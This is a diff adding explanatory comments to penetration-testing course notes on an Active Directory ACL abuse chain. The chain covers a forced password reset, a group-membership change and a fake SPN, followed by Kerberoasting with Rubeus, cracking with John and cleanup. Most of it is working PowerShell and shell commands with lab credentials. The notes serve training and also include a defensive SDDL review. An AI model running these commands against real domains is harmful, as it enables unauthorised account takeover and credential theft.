@@ -44,6 +44,7 @@ Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Cre
 # 3. Confirm removal
 Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName | ? {$_.MemberName -eq 'damundsen'}
 ```
+> Full ACL abuse chain from start to cleanup. Each step uses a `PSCredential` object to act as a different user. Cleanup order matters: remove the fake SPN before removing from the group, or you lose the rights needed to clear it.
 
 ---
 
@@ -68,6 +69,7 @@ wley
 $SecPassword = ConvertTo-SecureString 'transporter@4' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
 ```
+> Creates a credential token you can pass to PowerView commands. Replace `'transporter@4'` and `'INLANEFREIGHT\wley'` with the credentials you have. `-AsPlainText -Force` is required by PowerShell's secure string API.
 - PowerView functions accept `-Credential` to act as a different user without opening a new shell
 - `ConvertTo-SecureString` wraps the plaintext password so PS won't log it as cleartext
 - `PSCredential` object = identity token you pass to PowerView commands
@@ -77,6 +79,7 @@ $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley
 $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
 Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
 ```
+> Resets damundsen's password without knowing the current one. `-Credential $Cred` acts as wley. `-Verbose` confirms success. This is destructive — document the change and notify the client.
 - `ForceChangePassword` = can reset password without knowing the current one
 - We set it to something we know so we can authenticate as damundsen next
 - `-Verbose` always — confirms success or shows the error clearly
@@ -88,6 +91,7 @@ $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
 $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
 Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose
 ```
+> Adds damundsen to the group using damundsen's own `GenericWrite` right. Replace group name and member name for other targets. Once added, damundsen inherits all rights the group has through nesting.
 - damundsen has `GenericWrite` on Help Desk Level 1 = can add members
 - We add damundsen to the group so they inherit the group's rights
 - Help Desk Level 1 is nested inside Information Technology → damundsen now inherits IT group rights
@@ -99,6 +103,7 @@ $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
 $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)
 Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname='notahacker/LEGIT'} -Verbose
 ```
+> Writes a fake Service Principal Name (SPN) onto adunn's account. Any SPN value works — the goal is to make the account Kerberoastable. Re-create `$Cred2` first so it picks up damundsen's new group membership.
 - Recreate `$Cred2` to force fresh auth — the previous credential object won't reflect new group membership
 - `GenericAll` = full control, including writing the `servicePrincipalName` attribute
 - Setting any SPN makes the account Kerberoastable — the KDC will issue a TGS ticket encrypted with adunn's password hash
@@ -108,6 +113,7 @@ Set-DomainObject -Credential $Cred2 -Identity adunn -SET @{serviceprincipalname=
 ```powershell
 .\Rubeus.exe kerberoast /user:adunn /nowrap
 ```
+> Requests a Kerberos service ticket for adunn and prints the hash. `/user:` targets one account to reduce noise. `/nowrap` keeps the hash on one line so you can copy it without corruption.
 - Now that adunn has an SPN, we can request a TGS ticket from the KDC
 - The ticket is encrypted with adunn's NTLM hash → take it offline and crack
 - `/nowrap` = no line breaks → hash is copy-paste ready for Hashcat/John
@@ -118,6 +124,7 @@ echo '$krb5tgs$23$*adunn$...' > adunn_hash.txt   # single quotes — $ breaks in
 john adunn_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 # cracked: SyncMaster757
 ```
+> Cracks the Kerberos ticket hash offline. Use single quotes around the hash — double quotes cause the shell to interpret `$` as a variable. For Hashcat use `-m 13100` instead of John.
 - `$krb5tgs$23$` = RC4 ticket → Hashcat mode 13100, John format krb5tgs
 - Single quotes are mandatory — double quotes cause shell to interpret `$` as variable
 
@@ -128,6 +135,7 @@ Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname 
 # 2. Remove damundsen from group
 Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
 ```
+> Reverses the attack in the correct order. Remove the SPN first while you still have the group rights to do so. Then remove the group membership. Reversing the order leaves the fake SPN stuck on the account.
 - Must remove the SPN **before** removing from the group
 - Once damundsen leaves Help Desk L1, they lose GenericAll over adunn and can't clear the SPN
 - Notify client about damundsen's password change — they'll need to reset it back or alert the user
@@ -140,6 +148,7 @@ Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Cre
 # One-shot: creates SPN, requests hash, deletes SPN automatically
 python3 targetedKerberoast.py -v -d 'INLANEFREIGHT.LOCAL' -u 'damundsen' -p 'Pwn3d_by_ACLs!'
 ```
+> Linux alternative that handles SPN creation, ticket request, and cleanup automatically. `-v` shows verbose output. Replace domain, username, and password for other targets.
 - Cleaner for Linux-only assessments — no manual SPN creation/cleanup needed
 
 ---
@@ -157,6 +166,7 @@ ConvertFrom-SddlString "O:BAG:BAD:AI..." | select -ExpandProperty DiscretionaryA
 # Look for unexpected entries like:
 # INLANEFREIGHT\mrb3n: AccessAllowed (GenericWrite, ...)
 ```
+> Converts a raw Security Descriptor Definition Language (SDDL) string from an event log into readable ACL entries. Paste the SDDL value from the event. Look for accounts that should not have write or control rights.
 
 ---
 
